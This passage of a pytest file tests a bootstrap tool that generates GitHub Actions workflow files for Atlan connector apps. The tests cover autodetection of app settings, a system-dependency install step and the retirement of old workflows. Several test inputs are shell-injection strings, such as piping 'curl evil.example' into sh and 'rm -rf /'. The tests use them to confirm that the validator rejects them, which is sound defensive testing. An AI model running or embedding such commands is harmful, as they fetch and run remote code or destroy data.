    assert "# services-script:" not in content


def test_tests_yaml_no_unresolved_placeholders() -> None:
    content = render("tests.yaml")
    assert "<< " not in content
    assert " >>" not in content


def test_cmd_bootstrap_custom_app_args_propagate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(
        [
            "--app-name",
            "mysql",
            "--app-image-name",
            "custom-image-name",
            "--enable-e2e",
            "false",
        ]
    )
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'app-name: "mysql"' in tests
    assert 'app-image-name: "custom-image-name"' in tests
    assert "enable-e2e: false" in tests


# ---------------------------------------------------------------------------
# Auto-detection: app name from atlan.yaml
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_reads_app_name_from_atlan_yaml(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """bootstrap reads `name:` from atlan.yaml when --app-name is not supplied."""
    (tmp_path / "atlan.yaml").write_text("name: openapi\ndisplay_name: OpenAPI\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'app-name: "openapi"' in tests
    assert 'app-image-name: "atlan-openapi-app"' in tests


def test_cmd_bootstrap_strips_quotes_from_atlan_yaml_name(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Quoted name: \"openapi\" in atlan.yaml should still resolve to openapi."""
    (tmp_path / "atlan.yaml").write_text('name: "openapi"\n')
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'app-name: "openapi"' in tests


def test_cmd_bootstrap_explicit_app_name_overrides_atlan_yaml(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Explicit --app-name takes priority over atlan.yaml."""
    (tmp_path / "atlan.yaml").write_text("name: openapi\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--app-name", "mysql"])
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'app-name: "mysql"' in tests


def test_cmd_bootstrap_falls_back_to_dir_name(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Without atlan.yaml, app name is derived from the repo directory name."""
    app_dir = tmp_path / "atlan-postgres-app"
    app_dir.mkdir()
    monkeypatch.chdir(app_dir)
    _cmd_bootstrap([])
    tests = (app_dir / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'app-name: "postgres"' in tests
    assert 'app-image-name: "atlan-postgres-app"' in tests


def test_cmd_bootstrap_atlan_yaml_takes_priority_over_dir_name(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """atlan.yaml name: takes priority over the directory name."""
    app_dir = tmp_path / "atlan-wrong-app"
    app_dir.mkdir()
    (app_dir / "atlan.yaml").write_text("name: openapi\n")
    monkeypatch.chdir(app_dir)
    _cmd_bootstrap([])
    tests = (app_dir / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'app-name: "openapi"' in tests


# ---------------------------------------------------------------------------
# Auto-detection: services-script from .github/test/setup-services.sh
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_detects_services_script(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """bootstrap activates services-script when .github/test/setup-services.sh exists."""
    script = tmp_path / ".github" / "test" / "setup-services.sh"
    script.parent.mkdir(parents=True)
    script.write_text("#!/bin/bash\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'services-script: ".github/test/setup-services.sh"' in tests
    assert "# services-script:" not in tests


def test_cmd_bootstrap_no_services_script_when_absent(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Without setup-services.sh the services-script line stays commented out."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert "# services-script:" in tests
    assert 'services-script: ".github/test/setup-services.sh"' not in tests


def test_cmd_bootstrap_explicit_services_script_overrides_autodetect(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Explicit --services-script takes priority over auto-detected path."""
    script = tmp_path / ".github" / "test" / "setup-services.sh"
    script.parent.mkdir(parents=True)
    script.write_text("#!/bin/bash\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--services-script", ".github/test/custom-setup.sh"])
    tests = (tmp_path / ".github" / "workflows" / "tests.yaml").read_text()
    assert 'services-script: ".github/test/custom-setup.sh"' in tests


# ---------------------------------------------------------------------------
# checks.yml system-dependency step (--system-deps)
# ---------------------------------------------------------------------------

_KRB5_DEPS = "libkrb5-dev gcc python3-dev"


def _checks_yml(root: pathlib.Path) -> str:
    return (root / ".github" / "workflows" / "checks.yml").read_text()


def test_parse_bootstrap_args_system_deps() -> None:
    result = parse_bootstrap_args(["--system-deps", _KRB5_DEPS])
    assert result["system_deps"] == _KRB5_DEPS


def test_parse_bootstrap_args_system_deps_normalizes_whitespace() -> None:
    """Value is re-joined on single spaces so however it was spelled renders
    byte-identically -- otherwise C002 would read the spelling as drift."""
    result = parse_bootstrap_args(["--system-deps=  libkrb5-dev   gcc\n"])
    assert result["system_deps"] == "libkrb5-dev gcc"


@pytest.mark.parametrize(
    "value",
    [
        "libkrb5-dev; curl evil.example/x | sh",
        "libkrb5-dev && rm -rf /",
        "$(id)",
        "`id`",
        "pkg$HOME",
    ],
)
def test_parse_bootstrap_args_system_deps_rejects_shell_metacharacters(
    value: str, capsys: pytest.CaptureFixture[str]
) -> None:
    """The value is interpolated into a generated workflow's `run:` block, so a
    token that isn't a plausible apt package name is rejected, never escaped."""
    with pytest.raises(SystemExit) as exc:
        parse_bootstrap_args(["--system-deps", value])
    assert exc.value.code == 2
    assert "invalid package name" in capsys.readouterr().err


def test_checks_yml_without_deps_is_byte_identical_to_no_step_render() -> None:
    """The <% if %> tags hug their content so an un-taken block leaves no stray
    blank line -- a one-line whitespace difference here would surface as C002
    drift in every already-bootstrapped repo (none of which passes this flag)."""
    rendered = render("checks.yml")
    assert "apt-get" not in rendered
    # The checkout step is followed immediately by setup-deps, with nothing
    # (not even an empty line) where the conditional block sat.
    assert "# v7.0.1\n      - uses: atlanhq" in rendered


def test_checks_yml_renders_system_deps_step() -> None:
    rendered = render("checks.yml", system_deps=_KRB5_DEPS)
    assert f"sudo apt-get install -y {_KRB5_DEPS}" in rendered
    # Ordered before setup-deps: the packages exist to make its `uv sync` work.
    assert rendered.index("apt-get install") < rendered.index("setup-deps@main")


def test_cmd_bootstrap_writes_system_deps_step(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)


def test_cmd_bootstrap_omits_system_deps_step_by_default(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert "apt-get" not in _checks_yml(tmp_path)


def test_cmd_bootstrap_rerun_preserves_system_deps_step(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The regression this flag exists for: checks.yml is always-overwrite, so
    without autodetection a bare re-run deleted the step and the repo's
    pre-commit job then failed on a cold cache building an sdist."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
    first = _checks_yml(tmp_path)
    _cmd_bootstrap([])
    assert _checks_yml(tmp_path) == first


def test_cmd_bootstrap_detects_hand_written_system_deps_step(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Repos that hand-added the step before the flag existed keep it: detection
    reads any `apt-get install` line, not only the rendered shape."""
    wf = tmp_path / ".github" / "workflows" / "checks.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text(
        "name: Pre-commit Checks\n"
        "jobs:\n"
        "  pre-commit:\n"
        "    steps:\n"
        "      - name: Install system dependencies for pykerberos\n"
        "        run: |\n"
        "          sudo apt-get update\n"
        "          sudo apt-get install -y libkrb5-dev gcc python3-dev\n"
    )
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)


def test_cmd_bootstrap_explicit_system_deps_overrides_autodetect(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
    _cmd_bootstrap(["--system-deps", "libpq-dev"])
    checks = _checks_yml(tmp_path)
    assert "sudo apt-get install -y libpq-dev" in checks
    assert "libkrb5-dev" not in checks


def test_cmd_bootstrap_writes_ci_system_deps_file(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The D-series leg syncs the resolved env inside the *vendored* action, where
    no rendered per-repo value can reach it — it reads this file instead."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
    assert (
        tmp_path / ".github" / "ci-system-deps.txt"
    ).read_text() == f"{_KRB5_DEPS}\n"


def test_cmd_bootstrap_omits_ci_system_deps_file_when_no_deps(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An empty file would make hashFiles() non-empty and turn the guarded step
    into a pointless apt-get update on every D-leg run."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert not (tmp_path / ".github" / "ci-system-deps.txt").exists()


def test_cmd_bootstrap_detects_system_deps_from_ci_deps_file(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The txt file is the fallback signal when checks.yml carries no step."""
    deps_file = tmp_path / ".github" / "ci-system-deps.txt"
    deps_file.parent.mkdir(parents=True)
    deps_file.write_text("libkrb5-dev gcc\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert "sudo apt-get install -y libkrb5-dev gcc" in _checks_yml(tmp_path)


def test_cmd_bootstrap_ci_deps_file_ignores_junk_tokens(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A hand-edited file must not smuggle shell text into the rendered step."""
    deps_file = tmp_path / ".github" / "ci-system-deps.txt"
    deps_file.parent.mkdir(parents=True)
    deps_file.write_text("libkrb5-dev && curl evil.example | sh\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    install_line = next(
        line for line in _checks_yml(tmp_path).splitlines() if "apt-get install" in line
    )
    assert install_line.strip() == "sudo apt-get install -y libkrb5-dev"


def test_conformance_detect_action_installs_declared_system_deps() -> None:
    """The vendored action's install step is guarded by hashFiles so it no-ops in
    every repo without the declaration file."""
    action = render("run-conformance-detect-action.yaml")
    assert "hashFiles('.github/ci-system-deps.txt') != ''" in action
    assert "xargs -r sudo apt-get install -y < .github/ci-system-deps.txt" in action
    # Must run before the resolved-env sync it exists to unblock.
    assert action.index("ci-system-deps.txt") < action.index("Sync resolved env")


def test_cmd_bootstrap_rerun_after_manual_step_removal_leaves_it_out(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Documented way to drop the packages: delete BOTH signals, then re-run —
    there is nothing left on disk to detect, so they stay gone."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
    (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
    (tmp_path / ".github" / "ci-system-deps.txt").unlink()
    _cmd_bootstrap([])
    assert "apt-get" not in _checks_yml(tmp_path)
    assert not (tmp_path / ".github" / "ci-system-deps.txt").exists()


def test_cmd_bootstrap_restores_step_from_ci_deps_file_when_checks_stripped(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Deleting only the checks.yml step does not drop the packages — the txt
    file the D-leg reads is still authoritative, so the two can't disagree."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
    (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
    _cmd_bootstrap([])
    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)


# ---------------------------------------------------------------------------
# Retired workflows (FND-381): bootstrap installed these fleet-wide, so
# retiring one has to actively DELETE the copies it wrote. Dropping the
# template alone would leave ~54 repos with a workflow that still fires on
# every PR.
# ---------------------------------------------------------------------------


def test_retired_and_managed_sets_are_disjoint() -> None:
    """A name in both would be written and deleted in the same run."""
    assert not set(RETIRED_WORKFLOWS) & set(MANAGED_WORKFLOWS)


def test_retired_workflows_have_no_template() -> None:
    """The template must go with the registry entry, or bootstrap could still
    render a file it is meanwhile removing."""
    for name in RETIRED_WORKFLOWS:
        with pytest.raises(FileNotFoundError):
            render(name)


def test_cmd_bootstrap_removes_a_retired_workflow(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    for name in RETIRED_WORKFLOWS:
        (wf_dir / name).write_text("name: legacy\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    for name in RETIRED_WORKFLOWS:
        assert not (wf_dir / name).exists()


def test_cmd_bootstrap_does_not_recreate_a_retired_workflow(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    _cmd_bootstrap([])
    for name in RETIRED_WORKFLOWS:
        assert not (tmp_path / ".github" / "workflows" / name).exists()


def test_cmd_bootstrap_retired_workflow_absent_is_not_touched(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch, capsys
) -> None:
    """A repo that never had the file must not report it at all — neither as a
    removal nor as an unchanged path, since it does not and will not exist."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--json"])
    payload = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    for name in RETIRED_WORKFLOWS:
        rel = f".github/workflows/{name}"
        assert rel not in payload["touched"]
        assert rel not in payload["unchanged"]


def test_cmd_bootstrap_json_reports_a_removal_as_touched(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch, capsys
) -> None:
    """touched_files drives what a remediation pass stages -- a deletion is a
    change to that path and has to appear there, not under ``unchanged``."""
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    for name in RETIRED_WORKFLOWS:
        (wf_dir / name).write_text("name: legacy\n")
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--json"])
    payload = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    for name in RETIRED_WORKFLOWS:
        assert f".github/workflows/{name}" in payload["touched"]


# ---------------------------------------------------------------------------
# Auto-detection: unit-tests-workflow from build-and-publish.yaml
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_reads_unit_tests_workflow_from_build_and_publish(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """bootstrap reuses the existing unit_tests_workflow when the flag is absent."""
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "build-and-publish.yaml").write_text(
        'jobs:\n  build:\n    with:\n      unit_tests_workflow_file: "ci-tests.yaml"\n'
    )
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    build = (wf_dir / "build-and-publish.yaml").read_text()
    assert 'unit_tests_workflow_file: "ci-tests.yaml"' in build


def test_cmd_bootstrap_defaults_unit_tests_workflow_when_absent(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Without an existing build-and-publish.yaml, it defaults to tests.yaml."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    build = (tmp_path / ".github" / "workflows" / "build-and-publish.yaml").read_text()
    assert 'unit_tests_workflow_file: "tests.yaml"' in build


def test_cmd_bootstrap_defaults_unit_tests_workflow_when_file_exists_but_field_missing(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An existing build-and-publish.yaml with no unit_tests_workflow_file: line
    falls back to "tests.yaml", the same as the file-absent case."""
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "build-and-publish.yaml").write_text(
        "jobs:\n  build:\n    with:\n      other_field: true\n"
    )
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    build = (wf_dir / "build-and-publish.yaml").read_text()
    assert 'unit_tests_workflow_file: "tests.yaml"' in build


def test_cmd_bootstrap_explicit_unit_tests_workflow_overrides_autodetect(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Explicit --unit-tests-workflow takes priority over the auto-detected value."""
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "build-and-publish.yaml").write_text(
        'unit_tests_workflow_file: "ci-tests.yaml"\n'
    )
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--unit-tests-workflow", "override.yaml"])
    build = (wf_dir / "build-and-publish.yaml").read_text()
    assert 'unit_tests_workflow_file: "override.yaml"' in build


def test_cmd_bootstrap_reads_unquoted_unit_tests_workflow_from_build_and_publish(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An unquoted unit_tests_workflow_file: value (valid YAML) is still auto-detected."""
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "build-and-publish.yaml").write_text(
        "jobs:\n  build:\n    with:\n      unit_tests_workflow_file: ci-tests.yaml\n"
    )
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    build = (wf_dir / "build-and-publish.yaml").read_text()
    assert 'unit_tests_workflow_file: "ci-tests.yaml"' in build


# ---------------------------------------------------------------------------
# Auto-detection: --enforce from an existing conformance.yaml's exit-zero mode
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_rerun_no_enforce_preserves_soft_mode(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A bare re-run must not reset a soft-mode repo's conformance.yaml to hard-gate."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    conformance = tmp_path / ".github" / "workflows" / "conformance.yaml"
    assert _EXIT_ZERO_SOFT in conformance.read_text()
    _cmd_bootstrap([])
    assert _EXIT_ZERO_SOFT in conformance.read_text()


def test_cmd_bootstrap_rerun_no_enforce_preserves_hard_mode(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A bare re-run of an already-hard-gate repo stays hard-gate (control case)."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "true"])
    conformance = tmp_path / ".github" / "workflows" / "conformance.yaml"
    assert _EXIT_ZERO_HARD in conformance.read_text()
    _cmd_bootstrap([])
    assert _EXIT_ZERO_HARD in conformance.read_text()


def test_cmd_bootstrap_rerun_no_enforce_does_not_force_overwrite_renovate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Auto-detecting --enforce from conformance.yaml must not also force-overwrite
    renovate.json -- only an *explicit* --enforce on the invocation does that."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    rj = tmp_path / "renovate.json"
    rj.write_text('{"customised": true}\n')
    _cmd_bootstrap([])
    assert rj.read_text() == '{"customised": true}\n'
    assert not (tmp_path / "renovate.json.bak").exists()


def test_cmd_bootstrap_explicit_enforce_overrides_autodetected_soft_mode(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Explicit --enforce takes priority over a soft-mode conformance.yaml on disk."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    conformance = tmp_path / ".github" / "workflows" / "conformance.yaml"
    _cmd_bootstrap(["--enforce", "true"])
    assert _EXIT_ZERO_HARD in conformance.read_text()


def test_cmd_bootstrap_rerun_unparseable_conformance_yaml_falls_back_to_renovate(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A bare re-run must not silently flip enforcement to hard-gate just
    because conformance.yaml's exit-zero line doesn't match the expected
    pattern (hand-edited, or rendered by an older template) -- it should
    fall back to renovate.json's own soft/hard signal instead, so the two
    managed files can't end up in different enforcement modes."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    conformance = tmp_path / ".github" / "workflows" / "conformance.yaml"
    original = conformance.read_text()
    assert _EXIT_ZERO_SOFT in original
    corrupted = original.replace(_EXIT_ZERO_SOFT, "exit-zero: true  # hand-edited")
    assert corrupted != original
    conformance.write_text(corrupted)
    capsys.readouterr()  # discard bootstrap's own setup output
    _cmd_bootstrap([])
    assert _EXIT_ZERO_SOFT in conformance.read_text()
    assert "falling back to renovate.json" in capsys.readouterr().out


def test_cmd_bootstrap_rerun_unparseable_conformance_yaml_hard_mode_control(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Control case: the renovate.json fallback also preserves hard mode."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "true"])
    conformance = tmp_path / ".github" / "workflows" / "conformance.yaml"
    original = conformance.read_text()
    assert _EXIT_ZERO_HARD in original
    conformance.write_text(
        original.replace(_EXIT_ZERO_HARD, "exit-zero: false  # hand-edited")
    )
    _cmd_bootstrap([])
    assert _EXIT_ZERO_HARD in conformance.read_text()


def test_cmd_bootstrap_rerun_falls_back_to_hard_gate_when_renovate_json_malformed(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When conformance.yaml's exit-zero line is unparseable AND renovate.json
    is malformed JSON, the fallback chain (_read_enforce_from_renovate ->
    _extract_renovate_automerge) can't read either signal. It must default to
    hard-gate (the same default _extract_renovate_automerge documents for
    unparseable JSON) rather than raise or silently stay soft."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    conformance = tmp_path / ".github" / "workflows" / "conformance.yaml"
    conformance.write_text(
        conformance.read_text().replace(
            _EXIT_ZERO_SOFT, "exit-zero: true  # hand-edited"
        )
    )
    (tmp_path / "renovate.json").write_text("not valid json")
    capsys.readouterr()  # discard bootstrap's own setup output
    _cmd_bootstrap([])
    assert _EXIT_ZERO_HARD in conformance.read_text()
    assert "falling back to renovate.json" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# touched_files accuracy: a no-op re-run must not report unchanged managed
# files as updated (see remediate-finding.prose.md's touched_files
# write-scope note -- an over-broad touched_files would make a remediation
# pass revert unrelated already-accepted files on a later failure)
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_rerun_with_no_changes_reports_no_managed_file_as_updated(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A bare re-run against an already-bootstrapped, untouched repo must not
    print `updated:`/`installed:` for any managed workflow or action file --
    only `ok (up to date):`."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    capsys.readouterr()  # discard first-run output (everything is genuinely new)
    _cmd_bootstrap([])
    out = capsys.readouterr().out
    assert "updated:" not in out
    assert "installed:" not in out
    wf_dir = tmp_path / ".github" / "workflows"
    for name in MANAGED_WORKFLOWS:
        assert f"ok (up to date): {wf_dir / name}" in out
    for dest_rel, _template_name in MANAGED_ACTION_FILES:
        assert f"ok (up to date): {tmp_path / dest_rel}" in out
    skill_md = tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md"
    assert f"ok (up to date): {skill_md}" in out


# ---------------------------------------------------------------------------
# --json: structured touched-files manifest
#
# touched_files (remediate-finding.prose.md) must not require a caller to
# pattern-match this command's human-readable stdout prefixes -- --json
# emits one trailing JSON line with the same information structurally.
# ---------------------------------------------------------------------------


def _last_json_line(out: str):
    """Parse the final non-empty line of *out* as JSON.

    ``--json`` appends its summary as the last line after all the normal
    human-readable output, so callers only need the tail of stdout.
    """
    return json.loads(out.strip().splitlines()[-1])


def test_cmd_bootstrap_json_first_run_reports_everything_touched(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A fresh repo's first `--json` run reports every managed path as touched."""
    monkeypatch.chdir(tmp_path)
    exit_code = _cmd_bootstrap(["--json"])
    assert exit_code == 0
    manifest = _last_json_line(capsys.readouterr().out)
    assert manifest["skipped"] is False
    touched = set(manifest["touched"])
    wf_dir = pathlib.Path(".github", "workflows")
    for name in MANAGED_WORKFLOWS:
        assert str(wf_dir / name) in touched
    for dest_rel, _template_name in MANAGED_ACTION_FILES:
        assert dest_rel in touched
    assert str(pathlib.Path(".claude", "skills", "remediate", "SKILL.md")) in touched
    assert str(pathlib.Path(".github", "workflows", "tests.yaml")) in touched
    assert "renovate.json" in touched
    assert ".gitignore" in touched
    assert "contract_schema.lock.json" in touched
    assert manifest["unchanged"] == []


def test_cmd_bootstrap_json_rerun_with_no_changes_reports_empty_touched(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A bare re-run against an already-bootstrapped, untouched repo reports
    `touched: []` -- the whole point of the manifest is that a caller can
    trust an empty list means nothing needs to be considered for revert."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    capsys.readouterr()  # discard first-run output
    _cmd_bootstrap(["--json"])
    manifest = _last_json_line(capsys.readouterr().out)
    assert manifest["skipped"] is False
    assert manifest["touched"] == []
    skill_md = pathlib.Path(".claude", "skills", "remediate", "SKILL.md")
    assert str(skill_md) in manifest["unchanged"]


def test_cmd_bootstrap_json_inside_conformance_repo_reports_skipped(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The self-detection no-op reports `skipped: true` with empty manifests,
    not merely exit 0 with no explanation of why nothing was touched."""
    _seed_conformance_pyproject(tmp_path)
    monkeypatch.chdir(tmp_path)
    exit_code = _cmd_bootstrap(["--json"])
    assert exit_code == 0
    manifest = _last_json_line(capsys.readouterr().out)
    assert manifest == {"skipped": True, "touched": [], "unchanged": []}


def test_cmd_bootstrap_json_renovate_backup_counts_as_touched(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Forcing --enforce over a customised renovate.json backs up the old
    content to renovate.json.bak -- that backup path must appear in touched
    alongside renovate.json itself, so a rejected fix reverts both."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    (tmp_path / "renovate.json").write_text('{"customised": true}\n')
    capsys.readouterr()  # discard setup output
    _cmd_bootstrap(["--enforce", "false", "--json"])
    manifest = _last_json_line(capsys.readouterr().out)
    touched = set(manifest["touched"])
    assert "renovate.json" in touched
    assert "renovate.json.bak" in touched


def test_cmd_bootstrap_without_json_flag_prints_no_json_line(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Omitting --json must not change default output -- no trailing JSON line."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    out = capsys.readouterr().out
    with pytest.raises(json.JSONDecodeError):
        _last_json_line(out)


# ---------------------------------------------------------------------------
# enable-e2e: omitted when default (true)
# ---------------------------------------------------------------------------


def test_tests_yaml_enable_e2e_omitted_when_default() -> None:
    """enable-e2e: true is the reusable workflow default — don't emit it."""
    content = render("tests.yaml")
    assert "enable-e2e:" not in content


def test_tests_yaml_enable_e2e_present_when_false() -> None:
    """enable-e2e: false must appear explicitly to opt out of e2e."""
    content = render("tests.yaml", enable_e2e="false")
    assert "enable-e2e: false" in content


# ---------------------------------------------------------------------------
# derive_app_name_from_dir unit tests
# ---------------------------------------------------------------------------


def test_derive_strips_atlan_prefix_and_app_suffix(tmp_path: pathlib.Path) -> None:
    assert derive_app_name_from_dir(tmp_path / "atlan-openapi-app") == "openapi"


def test_derive_strips_only_prefix(tmp_path: pathlib.Path) -> None:
    assert derive_app_name_from_dir(tmp_path / "atlan-openapi") == "openapi"


def test_derive_strips_only_suffix(tmp_path: pathlib.Path) -> None:
    assert derive_app_name_from_dir(tmp_path / "my-connector-app") == "my-connector"


def test_derive_no_affixes(tmp_path: pathlib.Path) -> None:
    assert derive_app_name_from_dir(tmp_path / "postgres") == "postgres"


def test_derive_hello_world(tmp_path: pathlib.Path) -> None:
    assert derive_app_name_from_dir(tmp_path / "atlan-hello-world-app") == "hello-world"


# ---------------------------------------------------------------------------
# Vendored-template sync guard
#
# MANAGED_ACTION_FILES ships byte copies of files that also live in this
# monorepo (used directly by application-sdk's own conformance-reusable.yaml
# run, and vendored into every consumer repo by `bootstrap`). If the two
# drift apart, the SDK's own CI would keep exercising the fixed version while
# every bootstrapped consumer repo silently gets a stale one. Skipped when
# the monorepo tree isn't checked out (e.g. an isolated sdist build).
# ---------------------------------------------------------------------------

_MONOREPO_ROOT = pathlib.Path(__file__).resolve().parents[3]


@pytest.mark.parametrize("dest_rel,template_name", MANAGED_ACTION_FILES)
def test_managed_action_template_matches_canonical_source(
    dest_rel: str, template_name: str
) -> None:
    canonical = _MONOREPO_ROOT / dest_rel
    if not canonical.exists():
